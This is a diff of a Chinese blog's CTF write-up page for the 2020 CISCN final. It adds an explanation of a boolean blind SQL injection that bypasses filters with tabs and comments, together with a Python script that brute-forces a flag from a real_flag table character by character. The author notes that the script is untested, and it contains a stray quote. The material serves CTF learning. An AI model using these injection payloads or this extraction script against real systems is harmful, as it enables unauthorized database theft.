@@ -497,14 +497,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4k
+                    4.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    20 分
+                    21 分
                 </div>
                 
 
@@ -801,6 +801,7 @@ qrcode<span class="token punctuation">.</span>save<span class="token punctuation
 &amp;limit='10\tnana*/ord((select\tgroup_concat(flag)\tfrom\treal_flag))</code></pre><p>构造出来的 SQL 语句长这样。</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">1</span>\tor\t{x}<span class="token operator">-</span><span class="token comment" spellcheck="true">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tgroup_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
 <p>其中，<code>ord</code>函数<strong>返回的是字符串第一个字符的 ASCII 值</strong>，<code>group_concat</code>函数<strong>返回带有来自一个组的连接的非NULL值的字符串结果</strong>，也就是把flag字段的数据（默认用 <code>,</code> ）合并起来。</p>
+<p><code>fake_flag</code> 中有两项结果，<code>id</code> 分别对应着1和2。</p>
 <p><strong>如果 or 后面的表达式为假，即说明 x 和 flag 中的这一位对上了，那么查询出来的结果就只有一项了。</strong></p>
 <p>另外，发现没有拦截 <code>MID</code>，可以用这个来索引 flag。</p>
 <p>于是进一步构造 SQL 语句：</p>
@@ -808,8 +809,37 @@ qrcode<span class="token punctuation">.</span>save<span class="token punctuation
 <p>所以大概就遍历一下 x 的取值，从而把 flag 爆破出来。</p>
 <p>比如本地试一试，比如 <code>f</code> 对应 ASCII 为 102，此时只有一个结果。</p>
 <p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006034849125.png" alt="sql"></p>
+<blockquote>
+<p>当然也可以设置 <code>id</code> 为一个不存在的值，在正常情况下查询不到结果。</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">5</span>\tor\t{x}<span class="token operator">-</span><span class="token comment" spellcheck="true">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tMID<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>加入注入语句后，如果 x 和 flag 中的相应位置字符没对应上，则 or 之后的表达式结果不为0，即为真，那么查询时将有结果返回；</p>
+<p>而字符对应上的话，表达式结果为0，or 出来结果都为假，于是就查询不到结果。</p>
+<p>这样也能实现布尔盲注。</p>
+</blockquote>
+<p>参考网上jio本改了改：（大概逻辑这样，未实际测试</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+mystring <span class="token operator">=</span> string<span class="token punctuation">.</span>printable  <span class="token comment" spellcheck="true"># 所有可见字符</span>
+url <span class="token operator">=</span> <span class="token string">"http://URL/"</span>
+url <span class="token operator">+=</span> <span class="token string">"?id=5\tor\t{0}-/*'&amp;limit='10\tnana*/ord((select\tmid(group_concat(flag),{1})\tfrom\treal_flag))"</span>"
+reply <span class="token operator">=</span> <span class="token string">"searched nothing"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+count <span class="token operator">=</span> <span class="token number">1</span>
+result <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    temp_result <span class="token operator">=</span> result
+    <span class="token keyword">for</span> char <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> reply <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+            result <span class="token operator">+=</span> char
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token string">'......'</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">if</span> result <span class="token operator">==</span> temp_result<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Complete!'</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    count<span class="token operator">+=</span><span class="token number">1</span></code></pre>
 <p><em>（害，还是太菜了，连布尔盲注都不会嘤嘤嘤</em></p>
-<p><em>（后面有机会再补一下8</em></p>
 <h3 id="Web2-battle"><a href="#Web2-battle" class="headerlink" title="Web2 battle"></a>Web2 battle</h3><p>是一道 Node.js 的题。</p>
 <p><strong>部分源码：</strong></p>
 <pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span>  <span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//计算纯粹伤害</span>
@@ -1684,7 +1714,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">119.8k</span>&nbsp;字
+                class="white-color">120k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
